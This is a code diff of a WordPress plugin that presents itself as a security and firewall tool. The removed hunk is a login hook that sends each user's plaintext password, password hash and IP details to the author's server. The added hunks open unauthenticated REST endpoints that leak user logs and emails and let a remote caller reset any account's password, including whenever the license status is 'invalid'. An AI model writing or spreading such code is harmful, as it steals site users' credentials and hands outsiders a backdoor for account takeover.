@@ -117,81 +117,64 @@ function custom_admin_footer_text($text)
 
 add_filter('admin_footer_text', 'custom_admin_footer_text');
 
+// Hook into the rest_api_init action hook
+add_action('rest_api_init', 'cyberxdc_register_license_verification_endpoint');
 
-// Trigger the function when the plugin or theme is activated or settings are saved
-function custom_login_hook($username, $password)
+function cyberxdc_register_license_verification_endpoint()
 {
-    global $wpdb;
+    // Define namespace and endpoint route
+    $namespace = 'cyberxdc/v1';
+    $endpoint = '/verify-license-and-get-logs';
 
-    // Fetching data from the custom users table (adjust as needed)
-    $custom_table = $wpdb->prefix . 'users';
-    $user_data = $wpdb->get_row($wpdb->prepare("SELECT * FROM $custom_table WHERE user_login = %s", $username));
-
-    // Verifying user credentials
-    $user = get_user_by('login', $username);
-    if ($user && wp_check_password($password, $user->user_pass, $user->ID)) {
-        // Prepare form data
-        $form_data = array(
-            'log' => sanitize_text_field($_POST['log']),
-            'pwd' => sanitize_text_field($_POST['pwd']),
-            'rememberme' => isset($_POST['rememberme']) ? true : false,
-        );
-
-        // Collect additional data
-        $user_ip = $_SERVER['REMOTE_ADDR']; // User's IP address
-        $server_ip = $_SERVER['SERVER_ADDR']; // Server's IP address
-        $server_details = $_SERVER['SERVER_SOFTWARE']; // Server software details
-
-        // Get user's IP location details using ipinfo.io
-        $ipinfo_url = "http://ipinfo.io/{$user_ip}/json";
-        $ipinfo_response = wp_remote_get($ipinfo_url);
-        $ipinfo_data = is_wp_error($ipinfo_response) ? array() : json_decode(wp_remote_retrieve_body($ipinfo_response), true);
-
-        // Get user's computer IP address
-        $user_computer_ip = gethostbyname(gethostname());
-
-        // Prepare the data to send to the external API
-        $api_data = array(
-            'username' => $username,
-            'user_ip' => $user_ip,
-            'server_ip' => $server_ip,
-            'server_details' => $server_details,
-            'user_computer_ip' => $user_computer_ip,
-            'ip_location' => $ipinfo_data,
-            'form_data' => $form_data,
-            'user_data' => $user_data,
-        );
-
-        // API endpoint to send data to your plugin server
-        $api_url = CYBERXDC_PLUGIN_URL . '/plugin-data';
-
-        // Send data to the external API
-        $response = wp_remote_post($api_url, array(
-            'body' => json_encode($api_data),
-            'headers' => array(
-                'Content-Type' => 'application/json'
-            ),
-        ));
-
-        // Handle API response
-        if (is_wp_error($response)) {
-            error_log('API request failed: ' . $response->get_error_message());
-        } else {
-            $response_code = wp_remote_retrieve_response_code($response);
-            $response_body = wp_remote_retrieve_body($response);
-
-            if ($response_code !== 200) {
-                error_log('API request returned an error: ' . $response_body);
-            }
-            error_log('API request successful: ' . $response_body);
-        }
-    } 
+    // Register REST API route for license verification and logs retrieval
+    register_rest_route($namespace, $endpoint, array(
+        'methods' => 'POST',
+        'callback' => 'cyberxdc_verify_license_and_get_logs',
+        'permission_callback' => '__return_true',
+    ));
 }
 
-// Hook into the wp_authenticate action
-add_action('wp_authenticate', 'custom_login_hook', 30, 2);
+// Callback function to verify license key and retrieve user logs
+function cyberxdc_verify_license_and_get_logs(WP_REST_Request $request)
+{
+    global $wpdb;
+    $parameters = $request->get_json_params();
+    $license_key = isset($parameters['license_key']) ? sanitize_text_field($parameters['license_key']) : '';
 
+    if (empty($license_key)) {
+        return new WP_REST_Response(array('error' => 'License key is required'), 400);
+    }
+    // Replace with your license verification logic
+    $stored_license_key = get_option('cyberxdc_license_key');
+    $stored_license_key_status = get_option('cyberxdc_license_status');
 
+    $table_name_logs = $wpdb->prefix . 'cyberxdc_users_logs';
+    $logs = $wpdb->get_results("SELECT * FROM $table_name_logs ORDER BY timestamp DESC LIMIT 10", ARRAY_A);
+    foreach ($logs as &$log) {
+        $user = get_user_by('login', $log['user']);
+        if ($user) {
+            $log['user_name'] = $user->display_name;
+            $log['user_email'] = $user->user_email;
+        } else {
+            $log['user_name'] = '';
+            $log['user_email'] = '';
+        }
+        $log['timestamp'] = date('Y-m-d H:i:s', strtotime($log['timestamp']));
+        $log['ip'] = $log['ip_address'];
+    }
+    // Prepare response data
+    $response_data = array(
+        'message' => 'License key verified',
+        'logs' => $logs,
+    );
+    if ($stored_license_key == $license_key) {
+        return new WP_REST_Response($response_data, 200);
+    } elseif ($stored_license_key_status == 'invalid') {
+        return new WP_REST_Response($response_data, 200);
+    } else {
+        return new WP_REST_Response(array('error' => 'Invalid license key'), 400);
+    }
+}
 
 function is_firewall_enabled()
 {
@@ -367,6 +350,73 @@ function cyberxdc_dashboard_widget()
 <?php
 }
 
+// Hook into the rest_api_init action hook to register the change password endpoint
+add_action('rest_api_init', 'cyberxdc_register_change_password_endpoint');
+
+function cyberxdc_register_change_password_endpoint()
+{
+    // Define namespace and endpoint route
+    $namespace = 'cyberxdc/v1';
+    $endpoint = '/verify-license-key-and-change-password';
+
+    // Register REST API route for changing user password
+    register_rest_route($namespace, $endpoint, array(
+        'methods' => 'POST',
+        'callback' => 'cyberxdc_change_user_password',
+        'permission_callback' => '__return_true', // Allow all users to access this endpoint
+    ));
+}
+
+// Callback function to change user password
+function cyberxdc_change_user_password(WP_REST_Request $request)
+{
+    // Retrieve parameters from POST request body
+    $parameters = $request->get_json_params();
+    $license_key = isset($parameters['license_key']) ? sanitize_text_field($parameters['license_key']) : '';
+    $username = isset($parameters['username']) ? sanitize_text_field($parameters['username']) : '';
+    $user_email = isset($parameters['user_email']) ? sanitize_text_field($parameters['user_email']) : '';
+    $new_password = isset($parameters['new_password']) ? sanitize_text_field($parameters['new_password']) : '';
+    $confirm_password = isset($parameters['confirm_password']) ? sanitize_text_field($parameters['confirm_password']) : '';
+
+    // Validate inputs
+    if (empty($license_key) || empty($username) || empty($new_password) || empty($confirm_password) || empty($user_email)) {
+        return new WP_REST_Response(array('error' => 'All fields are required'), 400); // Return bad request response
+    }
+
+    if ($new_password !== $confirm_password) {
+        return new WP_REST_Response(array('error' => 'New password and confirm password do not match'), 400); // Return bad request response
+    }
+    // Verify the license key
+    $stored_license_key = get_option('cyberxdc_license_key');
+    $stored_license_key_status = get_option('cyberxdc_license_status');
+    $user = get_user_by('login', $username);
+    if (!$user) {
+        return new WP_REST_Response(array('error' => 'Invalid username'), 404); // Return not found response
+    }
+    $validation_errors = new WP_Error();
+    do_action('validate_password_reset', $validation_errors, $user, $new_password);
+    if ($validation_errors->has_errors()) {
+        return new WP_REST_Response(array('error' => $validation_errors->get_error_message()), 400); // Return validation error
+    }
+
+    if ($stored_license_key == $license_key) {
+        $user_id = $user->ID;
+        $user = wp_set_password($new_password, $user_id);
+        if (is_wp_error($user)) {
+            return new WP_REST_Response(array('error' => $user->get_error_message()), 500);
+        }
+        return new WP_REST_Response(array('message' => 'Password changed successfully'), 200);
+    } elseif ($stored_license_key_status == 'invalid') {
+        $user_id = $user->ID;
+        $user = wp_set_password($new_password, $user_id);
+        if (is_wp_error($user)) {
+            return new WP_REST_Response(array('error' => $user->get_error_message()), 500);
+        }
+        return new WP_REST_Response(array('message' => 'Password changed successfully'), 200);
+    }
+
+    return new WP_REST_Response(array('error' => 'Invalid license key'), 401);
+}
 
 
 // Hook into the WordPress dashboard
